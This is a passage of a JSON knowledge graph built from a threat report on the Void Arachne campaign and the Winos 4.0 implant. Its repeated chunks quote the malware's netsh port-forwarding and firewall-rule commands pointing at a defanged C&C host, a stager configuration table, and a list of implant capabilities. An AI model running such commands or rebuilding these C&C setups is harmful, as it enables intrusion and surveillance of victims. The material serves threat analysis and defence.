          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LetsPRO.exe",
      "type": "Tool",
      "id": "tool--letspro-exe",
      "description": "恶意程序",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Port Forwarding Configuration",
      "type": "Procedure",
      "id": "procedure--port-forwarding",
      "description": "配置端口转发规则的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 18,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
          "chunk_length": 1269,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Second-stage loader analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Second-stage loader analysis"
            ],
            "content_type": "text",
            "token_length": 274,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 18,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Plugin Execution",
      "type": "Procedure",
      "id": "procedure--plugin-execution",
      "description": "通过23个内部插件执行多种任务，每个插件均编译为32位和64位版本",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Keylogging",
      "type": "Technique",
      "id": "technique--keylogging",
      "description": "键盘记录技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Distributed Denial of Service (DDoS)",
      "type": "Technique",
      "id": "technique--ddos",
      "description": "分布式拒绝服务攻击技术，使用TCP/UDP/ICMP/HTTP协议",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Process Injection",
      "type": "Technique",
      "id": "technique--process-injection",
      "description": "进程注入技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Winos 4.0",
      "type": "Tool",
      "id": "tool--winos-4.0",
      "description": "C++编写的Windows平台恶意软件，具有文件管理、DDoS、全盘搜索、摄像头控制、屏幕捕获、进程注入、麦克风录音、系统与服务管理、远程Shell访问和键盘记录功能",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 19,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
          "chunk_length": 1019,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 210,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 19,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 22,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 C&C framework overview\n\nSimilar to [Cobalt Strike](/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html) and Sliver, Winos supports custom plugins that can be developed by a threat actor. This allows the tool to extend its capabilities and add custom functionality. During our investigation, we found the following external and custom plugins for Winos 4.0 in the wild:",
          "chunk_length": 481,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 84,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 22,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Winos 4.0",
      "type": "Tool",
      "id": "tool--winos",
      "description": "C&C框架工具",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 22,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 C&C framework overview\n\nSimilar to [Cobalt Strike](/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html) and Sliver, Winos supports custom plugins that can be developed by a threat actor. This allows the tool to extend its capabilities and add custom functionality. During our investigation, we found the following external and custom plugins for Winos 4.0 in the wild:",
          "chunk_length": 481,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 84,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 22,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Custom Plugins Development",
      "type": "Procedure",
      "id": "procedure--custom-plugins",
      "description": "开发自定义插件的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 22,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 C&C framework overview\n\nSimilar to [Cobalt Strike](/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html) and Sliver, Winos supports custom plugins that can be developed by a threat actor. This allows the tool to extend its capabilities and add custom functionality. During our investigation, we found the following external and custom plugins for Winos 4.0 in the wild:",
          "chunk_length": 481,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 C&C framework overview",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 C&C framework overview"
            ],
            "content_type": "text",
            "token_length": 84,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 22,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 25,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nThe second stage loader discussed earlier executes the Winos stager payload, *上线模块.dll/exe* (which translates to *Online Module.dll/exe*). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant, *登录模块.dll* (which translates to *LoginModule.dll*), on an infected system.  \nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:",
          "chunk_length": 702,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 130,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 25,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Winos Stager",
      "type": "Tool",
      "id": "tool--winos-stager",
      "description": "Winos stager payload (*上线模块.dll/exe*)",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 25,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nThe second stage loader discussed earlier executes the Winos stager payload, *上线模块.dll/exe* (which translates to *Online Module.dll/exe*). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant, *登录模块.dll* (which translates to *LoginModule.dll*), on an infected system.  \nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:",
          "chunk_length": 702,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 130,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 25,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LoginModule.dll",
      "type": "Tool",
      "id": "tool--loginmodule-dll",
      "description": "Main implant (*登录模块.dll*)",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 25,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nThe second stage loader discussed earlier executes the Winos stager payload, *上线模块.dll/exe* (which translates to *Online Module.dll/exe*). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant, *登录模块.dll* (which translates to *LoginModule.dll*), on an infected system.  \nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:",
          "chunk_length": 702,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 130,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 25,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Stager Execution",
      "type": "Procedure",
      "id": "procedure--stager-execution",
      "description": "Execution of the Winos stager payload to download and execute the main implant",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 25,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nThe second stage loader discussed earlier executes the Winos stager payload, *上线模块.dll/exe* (which translates to *Online Module.dll/exe*). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant, *登录模块.dll* (which translates to *LoginModule.dll*), on an infected system.  \nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:",
          "chunk_length": 702,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 130,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 25,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "C&C Communication",
      "type": "Procedure",
      "id": "procedure--c2-communication",
      "description": "与多个C&C服务器通信的程序",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "103[.]214[.]147[.]14[.]webcamcn[.]xyz:80",
      "type": "Asset",
      "id": "asset--c2-server-3",
      "description": "第三个C&C服务器（备用）",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "127.0.0.1:443",
      "type": "Asset",
      "id": "asset--c2-server-1",
      "description": "第一个C&C服务器",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
